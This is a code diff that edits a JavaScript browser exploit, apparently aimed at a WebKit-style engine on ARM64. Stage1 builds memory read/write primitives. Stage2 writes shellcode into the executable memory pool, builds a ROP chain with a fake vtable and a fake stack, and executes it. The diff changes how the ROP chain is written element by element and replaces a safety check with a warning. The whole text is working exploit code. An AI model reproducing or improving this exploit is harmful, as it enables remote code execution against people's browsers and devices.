@@ -727,7 +727,7 @@ var stage1 = function()
     	{
     		if(values[i] != 0)
     		{
-    			primitives.write_i64(where + i * 8, 0, values[i]);
+    			primitives.write_i64(Add(where,i*8),0, values[i]);
     		}
     	}
     };
@@ -764,6 +764,7 @@ var stage1 = function()
     };
     print("[+] Got stable Memory R/W");
     window.primitives = primitives;
+    millis(100);
 };
 
 
@@ -946,7 +947,7 @@ var stage2 = function()
     // Verify that we would actually end up in the executable memorypool.
    	if(shellcode_dst < startOfFixedExecutableMemoryPool) 
    	{
-   		throw "We can't target any address that is not in the executable memorypool";
+   		print("[+] We can't target any address that is not in the executable memorypool, exploit will fail.");
    	}
 
     // We need to write dlsym offset at the begin of our shellcode
@@ -989,8 +990,8 @@ var stage2 = function()
     }
 
     // We will now write our final chain to the element
-	print("[+] Writing ropchain to the element.");
-    primitives.write_non_zero(el, [
+	print("[+] Crafting ropchain for the element.");
+	var ropchain = [
     	buffer_addr, //fake vtable
     	0,
     	shellcode_src, // x21
@@ -999,7 +1000,17 @@ var stage2 = function()
         pop_x2, // linking register
         0,
         buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
-    ]);
+    ];
+
+	for(var i = 0; i < ropchain.length-1; i++)
+	{
+		print('[+] Writing ropchain (' + i + '/' + (ropchain.length - 1) +')');
+		if(ropchain[i] != 0)
+		{
+			primitives.write_i64(el, i, ropchain[i]);
+		}
+	}
+   
 
     print('[+] Executing our shellcode.');
     millis(100);
